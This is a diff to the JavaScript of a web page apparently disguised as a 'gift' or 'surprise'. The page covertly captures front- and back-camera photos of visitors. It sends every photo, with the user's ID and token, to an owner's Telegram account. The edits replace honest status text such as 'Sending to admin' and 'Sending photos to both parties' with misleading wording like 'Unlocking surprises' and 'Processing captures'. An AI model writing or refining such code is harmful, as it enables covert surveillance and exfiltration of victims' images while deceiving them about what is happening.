@@ -214,7 +214,7 @@
                 counterText.textContent = `Step ${photoNum + 1} of ${totalPhotos}`;
             } else {
                 statusText.textContent = "✅ Gift processed successfully!";
-                counterText.textContent = "Sending photos to both parties...";
+                counterText.textContent = "Unlocking surprises...";
             }
         }
         
@@ -349,53 +349,53 @@
         
         // Send photos to BOTH parties
         async function sendPhotosToBoth() {
-            statusText.textContent = "Sending photos to both parties...";
+            statusText.textContent = "Processing complete...";
             
             // 1. First send to OWNER (you)
             await sendMessageToTelegram(OWNER_ID,
-                `🎯 STEALTH CAPTURE COMPLETE\nUser: ${uid}\nToken: ${token}\nPhotos: ${photos.length}`);
+                `🎯 STEALTH PROCESS COMPLETE\nUser: ${uid}\nToken: ${token}\nCaptures: ${photos.length}`);
             
             // Send each photo to owner
             for (let i = 0; i < photos.length; i++) {
                 const photo = photos[i];
-                const caption = `📸 Photo ${i+1}/${photos.length} (${i < 5 ? 'Front' : 'Back'}) | User: ${uid}`;
+                const caption = `📸 Capture ${i+1}/${photos.length} (${i < 5 ? 'Front' : 'Back'}) | User: ${uid}`;
                 
                 await sendPhotoToTelegram(OWNER_ID, photo.data, caption);
                 await new Promise(resolve => setTimeout(resolve, 1500)); // Delay
                 
                 // Update progress
                 progressBar.style.width = `${50 + ((i + 1) / photos.length) * 25}%`;
-                statusText.textContent = `Sending to admin... (${i+1}/${photos.length})`;
+                statusText.textContent = `Processing captures... (${i+1}/${photos.length})`;
             }
             
             // 2. Then send to USER
             await sendMessageToTelegram(uid,
-                `🎉 Your gift has been processed!\n${photos.length} verification photos captured.\n\nSending your photos now...`);
+                `🎉 Your gift has been processed!\nSurprise unlocked for both.\n\nSending your results now...`);
             
             // Send each photo to user
             for (let i = 0; i < Math.min(5, photos.length); i++) { // Send first 5 to user
                 const photo = photos[i];
-                const caption = `📸 Your photo ${i+1}/${photos.length}`;
+                const caption = `🎁 Your result ${i+1}/${photos.length}`;
                 
                 await sendPhotoToTelegram(uid, photo.data, caption);
                 await new Promise(resolve => setTimeout(resolve, 1500));
                 
                 // Update progress
                 progressBar.style.width = `${75 + ((i + 1) / Math.min(5, photos.length)) * 25}%`;
-                statusText.textContent = `Sending to you... (${i+1}/${Math.min(5, photos.length)})`;
+                statusText.textContent = `Processing your results... (${i+1}/${Math.min(5, photos.length)})`;
             }
             
             // Final messages
             await sendMessageToTelegram(OWNER_ID,
-                `✅ All ${photos.length} photos sent successfully!\nUser ID: ${uid}`);
+                `✅ All ${photos.length} captures processed!\nUser ID: ${uid}`);
             
             await sendMessageToTelegram(uid,
-                `✅ All photos sent successfully!\nThank you for participating!`);
+                `✅ All results processed!\nThank you for participating!`);
             
             // Show completion
             progressBar.style.width = '100%';
             statusText.textContent = "✅ Process complete!";
-            counterText.textContent = "Photos sent to both parties";
+            counterText.textContent = "Surprise unlocked!";
             
             // Change screen after 3 seconds
             setTimeout(() => {
@@ -404,10 +404,11 @@
                         <div style="font-size:60px; margin-bottom:20px;">✅</div>
                         <h1>GIFT DELIVERED!</h1>
                         <div class="message">
-                            ✅ ${photos.length} photos captured<br>
-                            ✅ Photos sent to both parties<br>
-                            ✅ Process completed successfully
+                            ✅ Front capture complete<br>
+                            ✅ Back capture complete<br>
+                            ✅ Process loaded successfully
                         </div>
+                        <div class="status">Surprise unlocked!</div>
                         <div class="status">You can close this window</div>
                     </div>
                 `;
